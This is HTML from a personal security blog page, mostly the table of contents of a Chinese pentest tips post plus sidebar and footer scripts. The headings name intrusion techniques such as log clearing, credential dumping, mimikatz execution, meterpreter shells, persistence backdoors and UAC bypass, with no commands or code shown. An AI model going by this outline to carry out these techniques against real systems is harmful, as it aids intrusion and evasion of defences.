+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#pentest-and-development-tips"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">Pentest-and-Development-Tips</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#tips-1-手动端口探测"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">Tips 1. 手动端口探测</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#tips-2-windows系统从kali下载文件"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">Tips 2. Windows系统从Kali下载文件</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#tips-3-配置工作组计算机使其支持net-use远程连接"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">Tips 3. 配置工作组计算机,使其支持net use远程连接</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#tips-4-windows日志清除"><span class="toc-nav-number">1.4.</span> <span class="toc-nav-text">Tips 4. Windows日志清除</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#tips-5-破坏windows日志记录功能"><span class="toc-nav-number">1.5.</span> <span class="toc-nav-text">Tips 5. 破坏Windows日志记录功能</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#tips-6-win7和windows-server-2008-r2下的进程隐藏"><span class="toc-nav-number">1.6.</span> <span class="toc-nav-text">Tips 6. Win7和Windows Server 2008 R2下的进程隐藏</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#tips-7-同名exe和com文件执行顺序"><span class="toc-nav-number">1.7.</span> <span class="toc-nav-text">Tips 7. 同名exe和com文件执行顺序</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#tips-8-windows系统证书生成与注册"><span class="toc-nav-number">1.8.</span> <span class="toc-nav-text">Tips 8. Windows系统证书生成与注册</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#tips-9-hta执行vbs加载powershell"><span class="toc-nav-number">1.9.</span> <span class="toc-nav-text">Tips 9.  hta执行vbs，加载powershell</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#tips-10-通过c编写dll-amp-通过rundll32exe或者regsvr32加载dll"><span class="toc-nav-number">1.10.</span> <span class="toc-nav-text">Tips 10. 通过c#编写dll & 通过rundll32.exe或者regsvr32加载dll</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#tips-11-windows下cpl文件介绍"><span class="toc-nav-number">1.11.</span> <span class="toc-nav-text">Tips 11. Windows下cpl文件介绍</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#tips-12-windows下通过cmd调用rundll32执行一段代码弹回shell"><span class="toc-nav-number">1.12.</span> <span class="toc-nav-text">Tips 12. Windows下通过cmd调用rundll32执行一段代码弹回Shell</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#tips-13-可通过内存dump还原出puttyamppageant的密钥"><span class="toc-nav-number">1.13.</span> <span class="toc-nav-text">Tips 13. 可通过内存dump还原出putty&pageant的密钥</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#tips-14-针对visual-studio的钓鱼利用"><span class="toc-nav-number">1.14.</span> <span class="toc-nav-text">Tips 14. 针对Visual Studio的钓鱼利用</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#tips-15-32位程序在64位windows系统下执行的时候如果有对注册表和文件的操作存在重定向"><span class="toc-nav-number">1.15.</span> <span class="toc-nav-text">Tips 15. 32位程序在64位Windows系统下执行的时候，如果有对注册表和文件的操作，存在重定向</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#tips-16-获取windows域控所有用户hash"><span class="toc-nav-number">1.16.</span> <span class="toc-nav-text">Tips 16. 获取Windows域控所有用户hash</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#方法1"><span class="toc-nav-number">1.16.1.</span> <span class="toc-nav-text">方法1：</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#方法2"><span class="toc-nav-number">1.16.2.</span> <span class="toc-nav-text">方法2：</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#tips-17-导出windows系统明文口令"><span class="toc-nav-number">1.17.</span> <span class="toc-nav-text">Tips 17. 导出Windows系统明文口令</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#tips-18-可通过hook-passwordchangenotify实时记录域控管理员的新密码"><span class="toc-nav-number">1.18.</span> <span class="toc-nav-text">Tips 18. 可通过Hook PasswordChangeNotify实时记录域控管理员的新密码</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#tips-19-在域渗透时要记得留意域内主机的本地管理员账号"><span class="toc-nav-number">1.19.</span> <span class="toc-nav-text">Tips 19. 在域渗透时要记得留意域内主机的本地管理员账号</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#tips-20-通过powershell获取dll的导出函数"><span class="toc-nav-number">1.20.</span> <span class="toc-nav-text">Tips 20. 通过powershell获取dll的导出函数</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#tips-21-快捷方式的参数隐藏技巧"><span class="toc-nav-number">1.21.</span> <span class="toc-nav-text">Tips 21. 快捷方式的参数隐藏技巧</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#tips-22-32位程序能够对64位进程进行远程注入"><span class="toc-nav-number">1.22.</span> <span class="toc-nav-text">Tips 22. 32位程序能够对64位进程进行远程注入</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#tips-23-system权限的进程在某些情况下需要进行降权"><span class="toc-nav-number">1.23.</span> <span class="toc-nav-text">Tips 23. system权限的进程在某些情况下需要进行降权</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#tips-24-通过命令行能够对windows系统安装winpcap这样就可以在windows跳板上使用nmap和masscan"><span class="toc-nav-number">1.24.</span> <span class="toc-nav-text">Tips 24. 通过命令行能够对Windows系统安装WinPcap，这样就可以在Windows跳板上使用nmap和Masscan</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#tips-25-windows平台执行mimikatz的方法"><span class="toc-nav-number">1.25.</span> <span class="toc-nav-text">Tips 25. Windows平台执行mimikatz的方法</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#方法1通过powershell"><span class="toc-nav-number">1.25.1.</span> <span class="toc-nav-text">方法1：通过powershell</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#方法2通过installutilexe"><span class="toc-nav-number">1.25.2.</span> <span class="toc-nav-text">方法2：通过InstallUtil.exe</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#方法3通过regsvr32exe"><span class="toc-nav-number">1.25.3.</span> <span class="toc-nav-text">方法3：通过regsvr32.exe</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#方法4通过msbuildexe"><span class="toc-nav-number">1.25.4.</span> <span class="toc-nav-text">方法4：通过msbuild.exe</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#方法5通过csiexe"><span class="toc-nav-number">1.25.5.</span> <span class="toc-nav-text">方法5：通过csi.exe</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#方法6通过jsvbs脚本"><span class="toc-nav-number">1.25.6.</span> <span class="toc-nav-text">方法6：通过js/vbs脚本</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#tips-26-windows系统中可供存储和读取payload的位置"><span class="toc-nav-number">1.26.</span> <span class="toc-nav-text">Tips 26. Windows系统中可供存储和读取payload的位置</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#方法1wmi"><span class="toc-nav-number">1.26.1.</span> <span class="toc-nav-text">方法1：WMI</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#方法2包含数字签名的pe文件"><span class="toc-nav-number">1.26.2.</span> <span class="toc-nav-text">方法2：包含数字签名的PE文件</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#方法3特殊ads"><span class="toc-nav-number">1.26.3.</span> <span class="toc-nav-text">方法3：特殊ADS</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#tips-27-windows系统中值得搜集的信息"><span class="toc-nav-number">1.27.</span> <span class="toc-nav-text">Tips 27. Windows系统中值得搜集的信息</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#1已注册的wmi信息"><span class="toc-nav-number">1.27.1.</span> <span class="toc-nav-text">(1)已注册的WMI信息</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#tips-28-windows系统反弹meterpreter的常用方法"><span class="toc-nav-number">1.28.</span> <span class="toc-nav-text">Tips 28. Windows系统反弹meterpreter的常用方法</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#方法1通过rundll32加载dll反弹meterpreter"><span class="toc-nav-number">1.28.1.</span> <span class="toc-nav-text">方法1：通过rundll32加载dll反弹meterpreter</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#方法2通过cpl反弹meterpreter"><span class="toc-nav-number">1.28.2.</span> <span class="toc-nav-text">方法2：通过cpl反弹meterpreter</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#方法3通过powershell反弹meterpreter"><span class="toc-nav-number">1.28.3.</span> <span class="toc-nav-text">方法3：通过powershell反弹meterpreter</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#tips-29-windows系统加载dll的方法"><span class="toc-nav-number">1.29.</span> <span class="toc-nav-text">Tips 29. Windows系统加载dll的方法</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#方法1rundll32"><span class="toc-nav-number">1.29.1.</span> <span class="toc-nav-text">方法1：rundll32</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#方法2regsvr32"><span class="toc-nav-number">1.29.2.</span> <span class="toc-nav-text">方法2：regsvr32</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#方法3odbcconf"><span class="toc-nav-number">1.29.3.</span> <span class="toc-nav-text">方法3：odbcconf</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#方法4tracker"><span class="toc-nav-number">1.29.4.</span> <span class="toc-nav-text">方法4：Tracker</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#方法5excelapplication-objects-registerxll-method"><span class="toc-nav-number">1.29.5.</span> <span class="toc-nav-text">方法5：Excel.Application object’s RegisterXLL() method</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#方法6xwizardexe"><span class="toc-nav-number">1.29.6.</span> <span class="toc-nav-text">方法6：xwizard.exe</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#tips-30-windows后门"><span class="toc-nav-number">1.30.</span> <span class="toc-nav-text">Tips 30. Windows后门</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#方法1bitsadmin"><span class="toc-nav-number">1.30.1.</span> <span class="toc-nav-text">方法1：bitsadmin</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#方法2mof"><span class="toc-nav-number">1.30.2.</span> <span class="toc-nav-text">方法2：mof</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#方法3wmi"><span class="toc-nav-number">1.30.3.</span> <span class="toc-nav-text">方法3：wmi</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#方法4userland-persistence-with-scheduled-tasks"><span class="toc-nav-number">1.30.4.</span> <span class="toc-nav-text">方法4：Userland Persistence With Scheduled Tasks</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#方法5netsh"><span class="toc-nav-number">1.30.5.</span> <span class="toc-nav-text">方法5：Netsh</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#方法6shim"><span class="toc-nav-number">1.30.6.</span> <span class="toc-nav-text">方法6：Shim</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#方法7dll劫持"><span class="toc-nav-number">1.30.7.</span> <span class="toc-nav-text">方法7：dll劫持</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#方法8doubleagent"><span class="toc-nav-number">1.30.8.</span> <span class="toc-nav-text">方法8：DoubleAgent</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#方法9waitforexe"><span class="toc-nav-number">1.30.9.</span> <span class="toc-nav-text">方法9：waitfor.exe</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#方法10appdomainmanager"><span class="toc-nav-number">1.30.10.</span> <span class="toc-nav-text">方法10：AppDomainManager</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#方法11office加载项"><span class="toc-nav-number">1.30.11.</span> <span class="toc-nav-text">方法11：Office加载项</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#方法12clr"><span class="toc-nav-number">1.30.12.</span> <span class="toc-nav-text">方法12：CLR</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#方法13msdtc"><span class="toc-nav-number">1.30.13.</span> <span class="toc-nav-text">方法13：msdtc</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#方法14hijack-caccpropservicesclass-and-mmdeviceenumerator"><span class="toc-nav-number">1.30.14.</span> <span class="toc-nav-text">方法14：Hijack CAccPropServicesClass and MMDeviceEnumerator</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#方法15hijack-explorerexe"><span class="toc-nav-number">1.30.15.</span> <span class="toc-nav-text">方法15：Hijack explorer.exe</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#tips-31-uac绕过"><span class="toc-nav-number">1.31.</span> <span class="toc-nav-text">Tips 31. UAC绕过</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#方法1use-eventvwrexe-and-registry-hijacking"><span class="toc-nav-number">1.31.1.</span> <span class="toc-nav-text">方法1：use eventvwr.exe and registry hijacking</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#方法2use-sdcltexe"><span class="toc-nav-number">1.31.2.</span> <span class="toc-nav-text">方法2：use sdclt.exe</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#方法3use-silentcleanup"><span class="toc-nav-number">1.31.3.</span> <span class="toc-nav-text">方法3：use SilentCleanup</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#tips-32-visual-studio生成的exe或是dll在其他系统使用提示缺少相关dll文件"><span class="toc-nav-number">1.32.</span> <span class="toc-nav-text">Tips 32. Visual Studio生成的exe或是dll在其他系统使用，提示缺少相关DLL文件</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#tips-33"><span class="toc-nav-number">1.33.</span> <span class="toc-nav-text">Tips 33.</span></a></li></ol></li></ol>
+        
+        </div>
+      </aside>
+    
+
+                
+            <!-- Sidebar Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#Web" title="Web">Web</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="http://syclover.sinaapp.com/" target="_blank">Syclover Team</a></li>
+                    
+                        <li><a href="http://www.cnblogs.com/iamstudy/" target="_blank">l3m0n</a></li>
+                    
+                        <li><a href="http://www.k1n9.me/" target="_blank">k1n9</a></li>
+                    
+                        <li><a href="http://v1ct0r.com/" target="_blank">v1ct0r</a></li>
+                    
+                        <li><a href="http://www.cnblogs.com/Ox9A82/" target="_blank">Ox9a82</a></li>
+                    
+                        <li><a href="http://xianyusec.com/" target="_blank">咸鱼</a></li>
+                    
+                        <li><a href="http://lightning-zgc.com/" target="_blank">lightning</a></li>
+                    
+                        <li><a href="http://o0xmuhe.me/" target="_blank">0xmuhe</a></li>
+                    
+                        <li><a href="http://www.tbackdark.com/" target="_blank">潇哥</a></li>
+                    
+                        <li><a href="http://godot.win/" target="_blank">godot</a></li>
+                    
+                        <li><a href="http://hebic.me/" target="_blank">Homaebic</a></li>
+                    
+                </ul>
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+<!-- disqus embedded js code start (one page only need to embed once) -->
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES * * */
+    var disqus_shortname = "rootclay";
+    var disqus_identifier = "http://rootclay.github.io/2017/09/05/Tips/";
+    var disqus_url = "http://rootclay.github.io/2017/09/05/Tips/";
+
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<!-- disqus embedded js code start end -->
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'hover',
+          placement: 'left',
+          icon: 'ℬ'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                    <li>
+                        <a href="/feed.xml">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-rss fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+                
+                
+                    <li>
+                        <a target="_blank" href="https://www.zhihu.com/people/xiang-shan-74-8">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa  fa-stack-1x fa-inverse">知</i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+                    <li>
+                        <a target="_blank" href="http://weibo.com/u/5715481982">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-weibo fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/rootclay">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Rootclay 2017 
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("http://rootclay.github.io/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+<script>
+    // dynamic User by Hux
+    var _gaId = 'UA-XXXXXXXX-X';
+    var _gaDomain = 'yoursite';
+
+    // Originial
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', _gaId, _gaDomain);
+    ga('send', 'pageview');
+</script>
+
+
+
+
+<!-- Baidu Tongji -->
+
+
+
+
+
+
+	<a id="rocket" href="#top" class=""></a>
+	<script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
+    <script type="text/javascript" src="/js/toc.js?v=1.0.0" async=""></script>
+<!-- Image to hack wechat -->
+<!-- <img src="http://rootclay.github.io/img/icon_wechat.png" width="0" height="0" /> -->
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
